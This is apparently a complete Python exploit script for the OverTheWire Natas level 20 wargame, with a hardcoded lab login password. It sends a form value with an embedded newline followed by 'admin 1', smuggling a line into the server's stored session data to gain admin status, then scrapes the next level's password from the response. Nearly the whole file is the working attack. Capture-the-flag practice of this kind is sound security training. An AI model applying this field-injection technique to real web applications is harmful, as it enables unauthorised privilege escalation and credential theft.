# Natas20 python solution
# By Emil 'Dota' Bak, 2019

import requests

# ***********************************************
URL = "http://natas20.natas.labs.overthewire.org/"

auth_name = 'natas20'
auth_pass = 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'

s      = requests.Session()
s.auth = (auth_name,auth_pass)
# ***********************************************

# By tricking the server to read two lines (see viewable source code),
# it is possible to activate a print function which gives the password.
DATA = dict(name="a\nadmin 1")
s.post(URL, data=DATA)

# Request the URL again, the session will remember.
r = s.get(URL)

for x in r.iter_lines():
    if "Password" in x:
        print x[:-6]